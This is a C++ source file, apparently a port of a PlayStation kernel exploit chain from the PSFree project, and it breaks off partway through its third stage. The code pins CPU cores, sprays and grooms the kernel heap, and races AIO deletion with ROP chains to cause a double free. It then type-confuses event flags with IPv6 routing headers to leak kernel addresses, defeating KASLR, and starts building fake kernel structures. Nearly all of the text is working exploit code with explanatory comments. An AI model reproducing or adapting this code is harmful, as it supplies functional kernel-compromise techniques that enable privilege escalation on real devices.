/* Copyright (C) 2025 anonymous
This file is a port of https://github.com/kmeps4/PSFree/blob/main/lapse.mjs
which is part of the PSFree project.

PSFree is free software: you can redistribute it and/or modify
it under the terms of the GNU Affero General Public License as
published by the Free Software Foundation, either version 3 of the
License, or (at your option) any later version.

PSFree is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU Affero General Public License for more details.

You should have received a copy of the GNU Affero General Public License
along with this program.  If not, see <https://www.gnu.org/licenses/>. */

#include <mast1c0re.hpp>
#include "../helpers/helpers.cpp"
#include "../helpers/ruby_chan.cpp"

int32_t err = 0; // Global error variable

#define CPU_CORE 2

int32_t cpu_affinity_priority()
{
    uint64_t mask = 0;
    rtprio_s rtprio = {0};

    printf_debug("* Updating CPU affinity and priority...\n");

    // Get affinity
    err = get_affinity(&mask);
    if (err) goto end;
    printf_debug(
        "Initial affinity: %d %d %d %d %d %d %d %d\n",
        (int32_t)((mask >> 0) & 1), (int32_t)((mask >> 1) & 1),
        (int32_t)((mask >> 2) & 1), (int32_t)((mask >> 3) & 1),
        (int32_t)((mask >> 4) & 1), (int32_t)((mask >> 5) & 1),
        (int32_t)((mask >> 6) & 1), (int32_t)((mask >> 7) & 1)
    );

    // Pinning to `cpu_core`
    // Pin to 1 core so that we only use 1 per-cpu bucket.
    // This will make heap spraying and grooming easier.
    mask = 1 << CPU_CORE;
    err = set_affinity(&mask);
    if (err) goto end;
    // Recheck affinity
    mask = 0;
    err = get_affinity(&mask);
    if (err) goto end;
    printf_debug(
        "Updated affinity: %d %d %d %d %d %d %d %d\n",
        (int32_t)((mask >> 0) & 1), (int32_t)((mask >> 1) & 1),
        (int32_t)((mask >> 2) & 1), (int32_t)((mask >> 3) & 1),
        (int32_t)((mask >> 4) & 1), (int32_t)((mask >> 5) & 1),
        (int32_t)((mask >> 6) & 1), (int32_t)((mask >> 7) & 1)
    );

    // Get priority
    err = get_priority(&rtprio);
    if (err) goto end;
    printf_debug("Initial priority: type %d prio %d\n", rtprio.type, rtprio.prio);
    
    // Set priority to realtime 256 (highest we can achieve given our credentials)
    rtprio = { RTP_PRIO_REALTIME, 0x100 };
    err = set_priority(&rtprio);
    if (err) goto end;
    // Recheck priority
    rtprio = {0};
    err = get_priority(&rtprio);
    if (err) goto end;
    printf_debug("Updated priority: type %d prio %d\n", rtprio.type, rtprio.prio);

    end:
        return err;
}

#define NUM_SDS 100
#define NUM_WORKERS 2
#define NUM_GROOM_IDS 0x200
// Max number of req allocations per submission in one 0x80 malloc slab (3)
#define NUM_GROOM_REQS (0x80 / sizeof(SceKernelAioRWRequest))

struct setup_s
{
    unixpair_s              unixpair;
    int32_t                 sds[NUM_SDS];
    uint32_t                sock_count;
    SceKernelAioSubmitId    worker_id;
    SceKernelAioRWRequest   worker_reqs[NUM_WORKERS];
    SceKernelAioSubmitId    test_id;
    SceKernelAioRWRequest   test_req;
    useconds_t              timeout;
    SceKernelAioSubmitId    groom_ids[NUM_GROOM_IDS];
    SceKernelAioRWRequest   groom_reqs[NUM_GROOM_REQS];
};
setup_s setup_data = {0};

int32_t setup()
{
    printf_debug("STAGE 0: Setup\n");

    // CPU pinning and priority
    err = cpu_affinity_priority();
    if (err) goto end;

    printf_debug("* Blocking SceAIO...\n");

    // Create a unix socketpair to use as a blocking primitive
    err = create_unixpair(&setup_data.unixpair);
    if (err) goto end;
    printf_debug("Unix socketpair created: block_fd %d unblock_fd %d\n",
        setup_data.unixpair.block_fd, setup_data.unixpair.unblock_fd);

    // This part will block the worker threads from processing entries so that
    // we may cancel them instead. this is to work around the fact that
    // aio_worker_entry2() will fdrop() the file associated with the aio_entry
    // on ps5. we want aio_multi_delete() to call fdrop()
    for (uint32_t i = 0; i < NUM_WORKERS; i++) {
        setup_data.worker_reqs[i].nbyte = 1;
        setup_data.worker_reqs[i].fd = setup_data.unixpair.block_fd;
    }
    aio_submit_cmd(
        SCE_KERNEL_AIO_CMD_READ,
        setup_data.worker_reqs,
        NUM_WORKERS,
        SCE_KERNEL_AIO_PRIORITY_HIGH,
        &setup_data.worker_id
    );
    printf_debug("Worker AIOs submitted with ID: %d\n", setup_data.worker_id);

    // Check if AIO is blocked
    setup_data.test_req.fd = -1;
    aio_submit_cmd(
        SCE_KERNEL_AIO_CMD_READ,
        &setup_data.test_req,
        1,
        SCE_KERNEL_AIO_PRIORITY_HIGH,
        &setup_data.test_id
    );
    printf_debug("AIO test submitted with ID: %d\n", setup_data.test_id);

    reset_errno();
    setup_data.timeout = 1;
    aio_multi_wait(
        &setup_data.test_id,
        1,
        aio_errs,
        SCE_KERNEL_AIO_WAIT_AND,
        &setup_data.timeout
    );
    printf_debug("aio_multi_wait err[0] %d\n", aio_errs[0]);

    err = read_errno();
    if (err != 60) { // ETIMEDOUT
        printf_debug("SceAIO system not blocked. errno: %ld\n", err);
        err = -1;
        goto end;
    }
    printf_debug("SceAIO system blocked! errno: %ld\n", err);
    free_aios(&setup_data.test_id, 1);
    setup_data.test_id = 0; // Skip cleanup
    err = 0;

    printf_debug("* Spraying/grooming the heap...\n");

    // Heap spraying/grooming with AF_INET6 UDP sockets
    for (uint32_t i = 0; i < NUM_SDS; i++) {
        setup_data.sds[i] = create_ipv6udp();
        setup_data.sock_count += (setup_data.sds[i] < 0) ? 0 : 1;
    }
    printf_debug("Heap sprayed with %d AF_INET6 UDP sockets!\n",
        setup_data.sock_count);

    // Groom the heap with AIO requests
    for (uint32_t i = 0; i < NUM_GROOM_REQS; i++) {
        setup_data.groom_reqs[i].fd = -1;
    }
    // Allocate enough so that we start allocating from a newly created slab
    spray_aio(
        setup_data.groom_ids,
        NUM_GROOM_IDS,
        setup_data.groom_reqs,
        NUM_GROOM_REQS,
        false
    );
    // Cancel the groomed AIOs
    cancel_aios(setup_data.groom_ids, NUM_GROOM_IDS);
    printf_debug("Heap groomed with %d AIOs!\n", NUM_GROOM_IDS);

    end:
        return err;
}

struct in6_addr { uint8_t s6_addr[16]; };
template <size_t size>
struct ip6_rthdr
{
    static constexpr uint8_t len = ((size >> 3) - 1) & ~1;
    static constexpr uint8_t segleft = len >> 1;
    static constexpr uint8_t used_size = (len + 1) << 3;
    static constexpr uint8_t pad = size - used_size;
    uint8_t  ip6r_nxt = 0;
    uint8_t  ip6r_len = len;
    uint8_t  ip6r_type = 0;
    uint8_t  ip6r_segleft = segleft;
    uint32_t ip6r_reserved = 0;
    in6_addr ip6r_sigs[segleft] = {0};
    uint8_t  _pad[pad] = {0};
};

#define NUM_ALIAS 100
int32_t rthdr_sds[2] = {-1, -1};

int32_t make_aliased_rthdrs()
{
    int32_t *sds = setup_data.sds;
    ip6_rthdr<0x80> rthdr;

    for (uint32_t loop = 0; loop < NUM_ALIAS; loop++) {
        for (uint32_t i = 0; i < NUM_SDS; i++) {
            if (sds[i] < 0) continue; // Skip invalid sockets
            rthdr.ip6r_reserved = i; // Set a unique marker for each rthdr
            set_rthdr(sds[i], &rthdr, rthdr.used_size);
        }

        for (uint32_t i = 0; i < NUM_SDS; i++) {
            if (sds[i] < 0) continue; // Skip invalid sockets
            socklen_t len = rthdr.used_size;
            if (get_rthdr(sds[i], &rthdr, &len) != 0) continue;
            if (rthdr.ip6r_reserved == i) continue; // rthdr not aliased
            printf_debug("Aliased rthdrs %d & %d found at attempt: %d\n",
                i, rthdr.ip6r_reserved, loop);
            hexdump((uint8_t*)&rthdr, 0x80);
            rthdr_sds[0] = sds[i];
            rthdr_sds[1] = sds[rthdr.ip6r_reserved];
            printf_debug("rthdr_sds: %d %d\n", rthdr_sds[0], rthdr_sds[1]);
            sds[i] = -1;
            sds[rthdr.ip6r_reserved] = -1;
            free_rthdrs(sds, NUM_SDS);
            return 0;
        }
    }
    printf_debug("Failed to make aliased rthdrs!\n");
    return -1;
}

#define NUM_REQS 3
#define WHICH_REQ NUM_REQS - 1
#define NUM_RACES 100

#define SCE_KERNEL_ERROR_ESRCH 0x80020003
#define TCP_INFO 0x20
#define SIZE_TCP_INFO 0xec // Size of the TCP info structure
#define TCPS_ESTABLISHED 4

ScePthreadBarrier barrier = 0;
int32_t race_errs[2] = {0};
uint8_t thr_chain_buf[0x4000] __attribute__((aligned(16))) = {0};
uint8_t chain_buf[0x200] __attribute__((aligned(16))) = {0};

int32_t race_one(
    SceKernelAioSubmitId id,
    int32_t sd_conn
)
{
    ROP_Chain thr_chain = ROP_Chain((uint64_t*)thr_chain_buf, 0x4000);
    ROP_Chain chain = ROP_Chain((uint64_t*)chain_buf, 0x200);
    if (!thr_chain.is_initialized() || !chain.is_initialized())
    {
        printf_debug("Failed to initialize ROP chains!\n");
        return -1;
    }
    printf_debug("* Starting race...\n");

    int64_t rax = 0;
    {
    // Set thread affinity and priority
    uint64_t mask = 1 << CPU_CORE;
    thr_chain.push_call(
        LIBKERNEL(LIB_KERNEL_CPUSET_SETAFFINITY),
        CPU_LEVEL_WHICH,
        CPU_WHICH_TID,
        -1,
        8,
        PVAR_TO_NATIVE(&mask)
    );
    rtprio_s rtprio = { RTP_PRIO_REALTIME, 0x100 };
    thr_chain.push_call(
        LIBKERNEL(LIB_KERNEL_RTPRIO_THREAD),
        RTP_SET,
        0,
        PVAR_TO_NATIVE(&rtprio)
    );
    // Ready signal
    thr_chain.set_RAX(1);
    thr_chain.get_result(&rax);
    // Enter barrier
    thr_chain.push_call(
        LIBKERNEL(LIB_KERNEL_PTHREAD_BARRIER_WAIT),
        PVAR_TO_NATIVE(&barrier)
    );
    // Trigger AIO delete
    thr_chain.push_call(
        // LIBKERNEL(LIB_KERNEL_SCE_KERNEL_AIO_CANCEL_REQUESTS),
        syscall_wrappers[SYS_AIO_MULTI_DELETE],
        PVAR_TO_NATIVE(&id),
        1,
        PVAR_TO_NATIVE(race_errs)
    );
    thr_chain.push_call(
        EBOOT(EBOOT_WRITE_STUB),
        PS::Debug.sock,
        PVAR_TO_NATIVE("Exiting...\n"),
        11
    );
    }

    ScePthread thread = 0;
    err = thr_chain.execute(&thread);
    if (err) printf_debug("Failed to execute thread's ROP chain!\n");
    if (err) return err;

    uint64_t thread_id = DEREF(thread);
    printf_debug("Thread spawned! ID: %ld\n", thread_id);

    // Pthread barrier implementation:
    //
    // Given a barrier that needs N threads (set by `count` param) for it to be
    // unlocked, a thread will sleep if it waits on the barrier and N - 1 threads
    // havent't arrived before (i.e. not the last one to arrive)
    //
    // If there were already N - 1 threads then that thread (last waiter) won't
    // sleep and it will send out a wake-up call to the waiting threads
    //
    // Since the ps4's cores only have 1 hardware thread each, we can pin 2
    // threads on the same core and control the interleaving of their
    // executions via controlled context switches

    // Wait for the worker to enter the barrier and sleep
    // Yielding allows the worker to run
    while (rax == 0)
        PS::Breakout::call(LIBKERNEL(LIB_KERNEL_SCHED_YIELD));

    int64_t ret = -1;
    {
    // Enter the barrier as the last waiter
    chain.push_call(
        LIBKERNEL(LIB_KERNEL_SCE_PTHREAD_BARRIER_WAIT),
        PVAR_TO_NATIVE(&barrier)
    );
    // Yield and hope the scheduler runs the worker next. the worker will then
    // sleep at soclose() and hopefully we run next
    chain.push_call(LIBKERNEL(LIB_KERNEL_SCHED_YIELD));
    // If we get here and the worker hasn't been reran then we can delay the
    // worker's execution of soclose() indefinitely
    chain.push_call(
        syscall_wrappers[SYS_THR_SUSPEND_UCONTEXT],
        thread_id
    );
    chain.get_result(&ret);
    }

    err = chain.execute();
    if (err) printf_debug("Failed to execute ROP chain!\n");
    if (err) return err;

    printf_debug("ROP chain executed!\n");

    if (ret != 0)
    {
        printf_debug("Failed to suspend thread! Error: %p\n", read_errno());
        scePthreadJoin(thread, 0); // Wait for the thread to finish
        return -1;
    }

    bool won_race = false;

    // Poll AIO state
    SceKernelAioError poll_err = 0;
    aio_multi_poll(&id, 1, &poll_err);
    printf_debug("Poll: 0x%08x\n", poll_err);

    // Get TCP info
    uint8_t info_buf[SIZE_TCP_INFO] = {0};
    socklen_t info_size = SIZE_TCP_INFO;
    err = PS::getsockopt(
        sd_conn, IPPROTO_TCP, TCP_INFO, info_buf, &info_size
    );

    if (err || info_size != SIZE_TCP_INFO) {
        printf_debug("Failed to get TCP info! SIZE_TCP_INFO %d info_size %d\n",
            SIZE_TCP_INFO, info_size);
        PS::Breakout::call(syscall_wrappers[SYS_THR_RESUME_UCONTEXT], thread_id);
        scePthreadJoin(thread, 0); // Wait for the thread to finish
        printf_debug("Thread exited.\n");
        return -1;
    }

    printf_debug("TCP info retrieved! info_size: %d\n", info_size);

    uint8_t tcp_state = info_buf[0];
    printf_debug("tcp_state: %d\n", tcp_state);

    // To win, must make sure that poll_res == 0x10003/0x10004 and tcp_state == 5
    if (poll_err != SCE_KERNEL_ERROR_ESRCH && tcp_state != TCPS_ESTABLISHED)
    {
        // PANIC: double free on the 0x80 malloc zone. Important kernel
        // data may alias
        aio_multi_delete(&id, 1, &poll_err);
        won_race = true;
    }

    PS::Breakout::call(syscall_wrappers[SYS_THR_RESUME_UCONTEXT], thread_id);
    scePthreadJoin(thread, 0); // Wait for the thread to finish
    printf_debug("Thread exited.\n");

    if (won_race)
    {
        printf_debug("Race errors: 0x%08x 0x%08x\n", race_errs[0], race_errs[1]);
        // If the code has no bugs then this isn't possible but we keep the
        // check for easier debugging
        if (race_errs[0] != race_errs[1])
        {
            printf_debug("ERROR: bad won_race!\n");
            return -1;
        }
        // RESTORE: double freed memory has been reclaimed with harmless data
        // PANIC: 0x80 malloc zone pointers aliased
        return make_aliased_rthdrs();
    }

    return -1;
}


int32_t sd_listen = -1;

int32_t double_free_reqs()
{
    printf_debug("STAGE 1: Double free AIO queue entry\n");

    err = scePthreadBarrierInit(&barrier, 0, 2, 0);
    if (err) return err;
    printf_debug("Barrier initialized! %p\n", barrier);

    sockaddr_in server_addr = {0};
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = PS::htons(5050);
    server_addr.sin_addr.s_addr = PS::htonl(0x7f000001); // 127.0.0.1

    SceKernelAioRWRequest reqs[NUM_REQS] = {0};
    SceKernelAioSubmitId req_ids[NUM_REQS] = {0};
    SceKernelAioError req_errs[NUM_REQS] = {0};

    for (uint32_t i = 0; i < NUM_REQS; i++)
        reqs[i].fd = -1;

    sd_listen = PS::socket(AF_INET, SOCK_STREAM, 0);
    if (sd_listen < 0) printf_debug("Failed to create sd_listen: %p\n", read_errno());
    if (sd_listen < 0) return -1;

    int32_t optval = 1;
    err = PS::setsockopt(sd_listen, SOL_SOCKET, SO_REUSEADDR, &optval, sizeof(int32_t));
    if (err) printf_debug("Failed to set SO_REUSEADDR on sd_listen: %p\n", read_errno());
    if (err) return err;

    err = PS::bind(sd_listen, (sockaddr*)&server_addr, sizeof(sockaddr_in));
    if (err) printf_debug("Failed to bind socket: %p\n", read_errno());
    if (err) return err;
    
    err = PS::listen(sd_listen, 1);
    if (err) printf_debug("Failed to listen on socket: %p\n", read_errno());
    if (err) return err;

    for (uint32_t i = 0; i < NUM_RACES; i++) {
        int32_t sd_client = PS::socket(AF_INET, SOCK_STREAM, 0);
        if (sd_client < 0) printf_debug("Failed to create sd_client: %p\n", read_errno());
        if (sd_client < 0) continue;

        PS::connect(sd_client, (sockaddr *)&server_addr, sizeof(server_addr));
        int32_t sd_conn = PS::accept(sd_listen, 0, 0);
        if (sd_conn < 0) {
            printf_debug("Failed to establish connection: %p\n", read_errno());
            PS::close(sd_client);
            continue;
        }

        // Force soclose() to sleep
        linger optval_client = {1, 1};
        if (PS::setsockopt(
            sd_client, SOL_SOCKET, SO_LINGER, &optval_client, sizeof(optval_client)
        ) != 0)
        {
            printf_debug("Failed to set SO_LINGER on client socket: %p\n", read_errno());
            PS::close(sd_conn);
            PS::close(sd_client);
            continue;
        }

        printf_debug("sd_listen: %d sd_client: %d sd_conn: %d\n",
            sd_listen, sd_client, sd_conn);

        reqs[WHICH_REQ].fd = sd_client;
        aio_submit_cmd(
            SCE_KERNEL_AIO_CMD_WRITE | SCE_KERNEL_AIO_CMD_MULTI,
            reqs,
            NUM_REQS,
            SCE_KERNEL_AIO_PRIORITY_HIGH,
            req_ids
        );
        aio_multi_cancel(req_ids, NUM_REQS, req_errs);
        aio_multi_poll(req_ids, NUM_REQS, req_errs);

        printf_debug("AIOs submitted! IDs: %d %d %d\n",
            req_ids[0], req_ids[1], req_ids[2]);

        // Drop the reference so that aio_multi_delete() will trigger _fdrop()
        PS::close(sd_client);

        err = race_one(req_ids[WHICH_REQ], sd_conn);

        // MEMLEAK: if we won the race, aio_obj.ao_num_reqs got 
        // decremented twice. this will leave one request undeleted
        aio_multi_delete(req_ids, NUM_REQS, req_errs);
        PS::close(sd_conn);

        if (!err) {
            printf_debug("Won race at attempt %d\n", i);
            PS::close(sd_listen);
            scePthreadBarrierDestroy(&barrier);
            barrier = 0;
            return 0;
        }
    }

    printf_debug("Failed aio double free!\n");
    return -1;
}

struct aio_entry
{
    uint32_t ar2_cmd;              // 0x00
    uint32_t ar2_ticket;           // 0x04
    uint8_t _unk1[8];              // 0x08
    ptr64_t ar2_reqs1;             // 0x10
    ptr64_t ar2_info;              // 0x18
    ptr64_t ar2_batch;             // 0x20
    ptr64_t ar2_spinfo;            // 0x28
    SceKernelAioResult ar2_result; // 0x30
    uint64_t ar2_file;             // 0x40
    ptr64_t _unkptr1;              // 0x48
    ptr64_t ar2_qentry;            // 0x50
    // align to 0x80
    uint8_t _pad2[0x28];
};

bool verify_reqs2(aio_entry *reqs2)
{
    uint32_t prefix = 0;

    if (reqs2->ar2_cmd != SCE_KERNEL_AIO_CMD_WRITE)
        return false;

    // Example of heap addresses: 0xfffff0970a1e8780
    // They all should be prefixed by 0xffff
    if (reqs2->ar2_reqs1 >> 8*6 != 0xffff)
        return false;
    // and they must share the first 4 bytes (e.g. 0xfffff097)
    prefix = reqs2->ar2_reqs1 >> 8*4;

    if (reqs2->ar2_info >> 8*4 != prefix)
        return false;
    if (reqs2->ar2_batch >> 8*4 != prefix)
        return false;

    // state must be in the range [1,4], and _pad must be 0
    if (!(0 < reqs2->ar2_result.state && reqs2->ar2_result.state <= 4))
        return false;
    if (reqs2->ar2_result._pad != 0)
        return false;

    // ar2_file must be NULL since we passed a bad file descriptor to
    // aio_submit_cmd()
    if (reqs2->ar2_file != 0) {
        return false;
    }

    if (reqs2->_unkptr1 != 0) // Offset 0x48 can be NULL
    if (reqs2->_unkptr1 >> 8*4 != prefix)
        return false;

    if (reqs2->ar2_qentry >> 8*4 != prefix)
        return false;

    return true;
}

#define NUM_LEAKED_BLOCKS 16
#define NUM_HANDLES 256
// Max number of req allocations per submission in one 0x100 malloc slab (6)
#define NUM_ELEMS (0x100 / sizeof(SceKernelAioRWRequest))
#define NUM_LEAKS 5

struct stage2_s
{
    uint8_t buf[0x80 * NUM_LEAKED_BLOCKS] = {0};
    socklen_t len = 0x80;
    SceKernelEventFlag evf = 0;
    ptr64_t evf_cv_str_p = 0;
    ptr64_t evf_p = 0;
    ptr64_t reqs1 = 0;
    aio_entry *req2 = 0;
    SceKernelAioSubmitId target_id = 0;
};
stage2_s stage2_data;

int32_t leak_kernel_addrs()
{
    printf_debug("STAGE 2: Leak kernel addresses\n");

    PS::close(rthdr_sds[1]);
    rthdr_sds[1] = -1;

    // Type confuse a struct evf with a struct ip6_rthdr
    printf_debug("* Confuse evf with rthdr\n");

    SceKernelEventFlag evfs[NUM_HANDLES];

    for (uint32_t i = 0; i < NUM_ALIAS; i++)
    {
        PS2::memset(evfs, 0, sizeof(evfs));
        for (uint32_t j = 0; j < NUM_HANDLES; j++)
            // By setting evf flags to >= 0x0f00, the value rthdr.ip6r_len will
            // be 0x0f (15), allowing to leak the full contents of the rthdr.
            // `| j << 16` bitwise shenanigans will help locating evfs later
            new_evf(&evfs[j], 0x0f00 | j << 16);

        get_rthdr(rthdr_sds[0], stage2_data.buf, &stage2_data.len);
        uint32_t bit_pattern = ((uint32_t*)stage2_data.buf)[0];
        if ((bit_pattern >> 16) < NUM_HANDLES)
        {
            stage2_data.evf = evfs[bit_pattern >> 16];
            // Confirm our finding
            set_evf_flags(stage2_data.evf, bit_pattern | 1);
            get_rthdr(rthdr_sds[0], stage2_data.buf, &stage2_data.len);
            if (((uint32_t*)stage2_data.buf)[0] == (bit_pattern | 1))
                evfs[bit_pattern >> 16] = 0;
            else
                stage2_data.evf = 0;
        }

        for (uint32_t j = 0; j < NUM_HANDLES; j++)
            if (evfs[j] != 0) free_evf(evfs[j]);

        if (stage2_data.evf == 0) continue;
        printf_debug("Confused rthdr and evf at attempt: %d\n", i);
        hexdump(stage2_data.buf, 0x80);
        break;
    }

    if (stage2_data.evf == 0)
    {
        printf_debug("Failed to confuse evf with rthdr!\n");
        return -1;
    }

    // Fields we use from evf:
    // struct evf:
    //     uint64_t flags // 0x0
    //     struct {
    //         uint64_t cv_description; // 0x28: pointer to "evf cv"
    //         ...
    //     } cv;
    //     struct { // TAILQ_HEAD(struct evf_waiter)
    //         struct evf_waiter *tqh_first; // 0x38: pointer to first waiter
    //         struct evf_waiter **tqh_last; // 0x40: pointer to last's next
    //     } waiters;

    // evf.cv.cv_description = "evf cv"
    // string is located at the kernel's mapped ELF file
    // 0x007b5133 "evf cv" for FW 10.01.
    stage2_data.evf_cv_str_p = *(uint64_t*)(&stage2_data.buf[0x28]);

    printf_debug("\"evf cv\" string address found! %p\n",
        stage2_data.evf_cv_str_p);
    printf_debug("DEFEATED KASLR! Kernel base (10.01): %p\n",
        stage2_data.evf_cv_str_p - 0x007b5133);

    // Because of TAILQ_INIT() (a linked list macro), we have:
    // evf.waiters.tqh_last == &evf.waiters.tqh_first (closed loop)
    // It's the real address of the leaked `evf` object in the kernel heap
    // For what are we going to use this??
    stage2_data.evf_p = *(uint64_t*)(&stage2_data.buf[0x40]) - (uint64_t)0x38;
    
    // %p only works for 64-bit addresses when prefixed with 0xffffffff
    // for some reason.. We can blame PS2::vsprintf for that.
    printf_debug("Leaked evf address (kernel heap): 0x%08x%08x\n",
        (uint32_t)(stage2_data.evf_p >> 32), (uint32_t)stage2_data.evf_p);

    // Setting rthdr.ip6r_len to 0xff, allowing to read the next 0x80 blocks,
    // leaking adjacent objects
    set_evf_flags(stage2_data.evf, 0xff00);
    stage2_data.len *= NUM_LEAKED_BLOCKS;

    // Use reqs1 to fake a aio_info. set .ai_cred (offset 0x10) to offset 4 of
    // the reqs2 so crfree(ai_cred) will harmlessly decrement the .ar2_ticket
    // field ???
    ptr64_t ucred = stage2_data.evf_p + 4;

    SceKernelAioRWRequest leak_reqs[NUM_ELEMS] = {0};
    SceKernelAioSubmitId leak_ids[NUM_ELEMS * NUM_HANDLES] = {0};

    leak_reqs[0].buf = ucred;
    for (uint32_t i = 0; i < NUM_ELEMS; i++)
        leak_reqs[i].fd = -1;

    printf_debug("* Find aio_entry\n");

    uint32_t reqs2_off = 0;
    for (uint32_t i = 0; i < NUM_LEAKS; i++) {
        spray_aio(
            leak_ids,
            NUM_HANDLES,
            leak_reqs,
            NUM_ELEMS,
            true,
            SCE_KERNEL_AIO_CMD_WRITE
        );
        get_rthdr(rthdr_sds[0], stage2_data.buf, &stage2_data.len);
        for (uint32_t off = 0x80; off < stage2_data.len; off += 0x80) {
            if (!verify_reqs2((aio_entry *)&stage2_data.buf[off])) continue;
            reqs2_off = off;
            printf_debug("Found reqs2 at attempt: %d\n", i);
            hexdump(&stage2_data.buf[off], 0x80);
            goto loop_break;
        }
        free_aios(leak_ids, NUM_ELEMS * NUM_HANDLES);
    }
    loop_break:

    if (reqs2_off == 0) {
        printf_debug("Could not leak a reqs2!\n");
        return -1;
    }
    printf_debug("reqs2 offset: %p\n", reqs2_off);
    stage2_data.req2 = (aio_entry *)&stage2_data.buf[reqs2_off];

    stage2_data.reqs1 = stage2_data.req2->ar2_reqs1;
    printf_debug("reqs1: 0x%08x%08x\n", 
        (uint32_t)(stage2_data.reqs1 >> 32), (uint32_t)stage2_data.reqs1);
    stage2_data.reqs1 &= -0x100LL;
    printf_debug("reqs1: 0x%08x%08x\n",
        (uint32_t)(stage2_data.reqs1 >> 32), (uint32_t)stage2_data.reqs1);

    printf_debug("* Searching target_id\n");

    SceKernelAioSubmitId *to_cancel_p = 0;
    uint32_t to_cancel_len = 0;

    for (uint32_t i = 0; i < NUM_ELEMS * NUM_HANDLES; i += NUM_ELEMS)
    {
        aio_multi_cancel(&leak_ids[i], NUM_ELEMS, aio_errs);
        get_rthdr(rthdr_sds[0], stage2_data.buf, &stage2_data.len);
        if (stage2_data.req2->ar2_result.state != SCE_KERNEL_AIO_STATE_ABORTED)
            continue;
        printf_debug("Found target_id at batch: %d\n", i / NUM_ELEMS);
        hexdump((uint8_t *)stage2_data.req2, 0x80);
        // Why do we assume that target_id is the first one in the batch?
        // It could be any of the `NUM_ELEMS`, right?
        stage2_data.target_id = leak_ids[i];
        leak_ids[i] = 0; // target_id won't be freed by free_aios2
        printf_debug("target_id: %p\n", stage2_data.target_id);
        to_cancel_p = &leak_ids[i + NUM_ELEMS];
        to_cancel_len = (NUM_ELEMS * NUM_HANDLES) - (i + NUM_ELEMS);
        break;
    }

    if (stage2_data.target_id == 0)
    {
        printf_debug("Failed to find target_id!\n");
        free_aios(leak_ids, NUM_ELEMS * NUM_HANDLES);
        return -1;
    }

    cancel_aios(to_cancel_p, to_cancel_len);
    free_aios2(leak_ids, NUM_ELEMS * NUM_HANDLES);

    return 0;
}

int32_t pktopts_sds[2] = {-1, -1};

int32_t make_aliased_pktopts()
{
    int32_t *sds = setup_data.sds;
    uint32_t tclass = 0;

    for (uint32_t loop = 0; loop < NUM_ALIAS; loop++)
    {
        for (uint32_t i = 0; i < NUM_SDS; i++)
        {
            if (sds[i] < 0) continue; // Skip invalid sockets
            tclass = i;
            PS::setsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, &tclass, sizeof(tclass));
            // Clean-up needed !!!
        }

        for (uint32_t i = 0; i < NUM_SDS; i++)
        {
            if (sds[i] < 0) continue; // Skip invalid sockets
            socklen_t len = sizeof(tclass);
            err = PS::getsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, &tclass, &len);
            if (err) continue;
            if (tclass == i) continue; // tclass not aliased
            printf_debug("Aliased pktopts %d & %d found at attempt: %d\n",
                i, tclass, loop);
            pktopts_sds[0] = sds[i];
            pktopts_sds[1] = sds[tclass];
            printf_debug("pktopts_sds: %d %d\n", pktopts_sds[0], pktopts_sds[1]);

            // Add pktopts to the new sockets now while new allocs can't
            // use the double freed memory
            sds[tclass] = create_ipv6udp();
            sds[i] = create_ipv6udp();
            len = sizeof(tclass);
            PS::setsockopt(sds[tclass], IPPROTO_IPV6, IPV6_TCLASS, &tclass, sizeof(tclass));
            PS::setsockopt(sds[i], IPPROTO_IPV6, IPV6_TCLASS, &tclass, sizeof(tclass));
            return 0;
        }

        for (uint32_t i = 0; i < NUM_SDS; i++)
        {
            if (sds[i] < 0) continue; // Skip invalid sockets
            PS::setsockopt(sds[i], IPPROTO_IPV6, IPV6_2292PKTOPTIONS, 0, 0);
        }
    }
    printf_debug("Failed to make aliased pktopts!\n");
    return -1;
}

#define MAX_LEAK_LEN 0x800
#define NUM_BATCHES 2
#define NUM_CLOBBERS 8

int32_t dirty_sd = -1;

int32_t double_free_reqs1()
{
    printf_debug("STAGE 3: Double free SceKernelAioRWRequest\n");

    uint8_t buf[0x80 * NUM_LEAKED_BLOCKS] = {0};

    SceKernelAioRWRequest reqs[MAX_REQS] = {0};
    SceKernelAioSubmitId ids[MAX_REQS * NUM_BATCHES] = {0};
    SceKernelAioError states[MAX_REQS] = {0};

    for (uint32_t i = 0; i < MAX_REQS; i++)
        reqs[i].fd = -1;

    printf_debug("* Start overwrite rthdr with AIO queue entry loop\n");

    bool aio_not_found = true;
    free_evf(stage2_data.evf);
    for (uint32_t i = 0; i < NUM_CLOBBERS; i++)
    {
        spray_aio(ids, NUM_BATCHES, reqs, MAX_REQS);
        socklen_t len = MAX_LEAK_LEN;
        get_rthdr(rthdr_sds[0], buf, &len);
        if (len == 8 && buf[0] == SCE_KERNEL_AIO_CMD_READ)
        {
            printf_debug("Aliased at attempt: %d\n", i);
            hexdump(buf, 0x80);
            aio_not_found = false;
            cancel_aios(ids, MAX_REQS * NUM_BATCHES);
            break;
        }
        free_aios(ids, MAX_REQS * NUM_BATCHES);
    }
    if (aio_not_found) {
        printf_debug("Failed to overwrite rthdr\n");
        return -1;
    }

    ip6_rthdr<0x80> rthdr = {0};
    aio_entry *reqs2 = (aio_entry *)&rthdr;

    reqs2->ar2_ticket = 5;
    reqs2->ar2_info = stage2_data.reqs1;
    // Craft a aio_batch using the end portion of the buffer
    reqs2->ar2_batch = stage2_data.evf_p + 0x28;

    // [.ar3_num_reqs, .ar3_reqs_left] aliases .ar2_spinfo
    // safe since free_queue_entry() doesn't deref the pointer
    *((uint32_t*)&reqs2->ar2_spinfo) = 1;
    *((uint32_t*)&reqs2->ar2_spinfo + 1) = 0;

    // [.ar3_state, .ar3_done] aliases .ar2_result.returnValue
    *((uint32_t*)&reqs2->ar2_result.returnValue)
        = SCE_KERNEL_AIO_STATE_COMPLETED;
    *((uint32_t*)&reqs2->ar2_result.returnValue + 1) = 0;

    // .ar3_lock aliases .ar2_qentry (rest of the buffer is padding)
    // safe since the entry already got dequeued
    //
    // .ar3_lock.lock_object.lo_flags = (
    //     LO_SLEEPABLE | LO_UPGRADABLE
    //     | LO_RECURSABLE | LO_DUPOK | LO_WITNESS
    //     | 6 << LO_CLASSSHIFT
    //     | LO_INITIALIZED
    // )
    *((uint32_t*)&reqs2->ar2_qentry) = 0x67b0000;

    // .ar3_lock.lk_lock = LK_UNLOCKED
